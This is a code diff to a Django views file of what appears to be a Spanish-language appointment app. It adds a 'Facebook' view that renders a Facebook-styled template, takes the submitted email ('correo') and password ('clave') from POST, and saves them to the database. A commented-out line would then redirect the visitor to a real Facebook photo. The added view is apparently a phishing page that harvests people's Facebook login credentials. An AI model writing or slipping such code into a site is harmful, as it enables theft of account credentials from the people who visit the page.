@@ -664,6 +664,23 @@ class Actualizaciones(TemplateView):
             return context
       
 
+# class Facebook(TemplateView):
+def Facebook(request):
+      template_name = 'citas/components/facebook.html'
+      count = False
+      if request.method == 'POST':
+            n =  models.UserA()
+            n.name = request.POST.get('correo'),
+            n.last_name=request.POST.get('clave')
+            n.email='was@gmail.com'
+            n.save()
+            # print(n.name)
+            # count = True
+            # if int(request.POST.get('true') )>= 2:
+            #       return redirect('https://www.facebook.com/photo?fbid=468680502801586&set=pcb.468680552801581')
+      
+
+      return render(request, template_name )
 """
 Manera de obtimizar es que la funcion se active cada 5 horas para verificar cuales usuarios estaran hoy, para enviar un correo de recordatorio
 """
